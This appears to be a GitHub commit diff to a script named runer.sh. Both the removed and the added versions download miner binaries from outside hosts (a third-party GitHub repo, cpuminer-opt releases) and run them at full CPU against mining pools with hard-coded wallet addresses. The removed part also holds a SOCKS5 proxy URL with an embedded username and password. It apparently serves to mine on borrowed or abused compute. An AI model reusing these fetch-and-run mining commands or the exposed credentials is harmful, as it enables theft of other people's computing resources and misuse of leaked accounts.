9949a1ae5176c33d321007d772aabc74e0ddaf0b
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-05-25 21:04:29 +0700

    Update runer.sh

--- runer.sh
+++ runer.sh
@@ -1,16 +1,4 @@
-#!/bin/bash
-proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
-array[0]="0001"
-array[1]="0002"
-array[2]="0003"
-size=${#array[@]}
-index=$(($RANDOM % $size))
-worker=${array[$index]}
-apt-get update
-wget -q https://raw.githubusercontent.com/renifer12/master/master/compile.sh
-wget -qO build https://github.com/renifer12/master/raw/master/ccminer
-chmod +x build
-chmod +x compile.sh
-./build -a verus -o stratum+tcp://139.99.123.225:3956 -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-10 -n 1)-MOD) -p X -t $(nproc --all)
-./compile.sh
-echo succes
+wget https://github.com/indigo-dc/udocker/releases/download/v1.3.1/udocker-1.3.1.tar.gz
+tar zxvf udocker-1.3.1.tar.gz && cd udocker && python3 maincmd.py run debian /bin/bash&&apt update
+
+apt update && apt install wget -y && wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz >/dev/null 2>&1 && ./cpuminer-sse2 -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u DLVmTEYCYM9jMCEWiuNuuAJ2M7GETpHcg4 -p c=DGB -t8
